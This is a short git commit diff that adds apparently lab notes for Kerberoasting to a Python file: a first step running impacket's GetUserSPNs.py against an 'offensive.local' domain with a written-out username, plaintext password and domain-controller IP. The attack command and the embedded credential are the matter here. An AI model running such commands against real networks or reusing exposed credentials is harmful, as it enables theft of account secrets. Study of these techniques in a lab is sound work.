83f484a1ee3c6fba43f08441f0a2d59a2e5ddd03
andrei2siminic <andrei2siminic@gmail.com>
2025-05-08 17:56:11 +0200

    Update code.py

--- code.py
+++ code.py
@@ -1,1 +1,6 @@
-# code to be added here
+# Kerberoasting
+
+#Step 1: Discover SPNs: 
+/usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
+  offensive.local/merissa.lorrayne:Ip]z6tM0e*xC  \
+ -dc-ip 192.168.56.2# code to be added here
